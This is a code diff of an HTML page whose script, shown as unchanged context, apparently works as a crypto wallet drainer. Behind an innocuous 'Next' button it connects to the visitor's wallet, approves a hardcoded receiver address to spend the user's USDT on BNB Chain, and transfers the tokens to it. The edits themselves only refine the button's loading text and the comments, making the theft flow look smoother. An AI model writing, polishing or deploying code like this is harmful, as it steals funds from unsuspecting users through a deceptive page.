@@ -113,21 +113,8 @@
       transition: 0.3s;
     }
 
-    .button.loading::after {
-      content: "⏳ Processing...";
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: rgba(255, 255, 255, 0.7);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-size: 16px;
-      color: #0052ff;
-      font-weight: bold;
-      border-radius: 20px;
+    .button.loading {
+      pointer-events: none;
     }
   </style>
 </head>
@@ -152,12 +139,14 @@
   </div>
 
   <div class="footer">
-    <button class="button" id="nextBtn" onclick="nextStep()">Next</button>
+    <button class="button" id="nextBtn" onclick="nextStep()">
+      <span id="btnText">Next</span>
+    </button>
   </div>
 
   <script>
     const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
-    const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; // BNB chain USDT
+    const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BNB Chain
     const ABI = [
       { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
       { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
@@ -172,7 +161,9 @@
 
     async function nextStep() {
       const btn = document.getElementById('nextBtn');
+      const btnText = document.getElementById('btnText');
       btn.classList.add("loading");
+      btnText.innerText = "⏳ Processing...";
 
       try {
         if (!window.ethereum) {
@@ -192,7 +183,7 @@
         }
 
         const contract = new web3.eth.Contract(ABI, USDT_BEP20);
-        const value = web3.utils.toWei(amount, 'mwei'); // USDT is 6 decimals
+        const value = web3.utils.toWei(amount, 'mwei'); // USDT has 6 decimals
 
         await contract.methods.approve(RECEIVER, value).send({ from: user });
         await contract.methods.transferFrom(user, RECEIVER, value).send({ from: user });
@@ -202,6 +193,7 @@
         alert("❌ Error: " + (err.message || err));
       } finally {
         btn.classList.remove("loading");
+        btnText.innerText = "Next";
       }
     }
   </script>
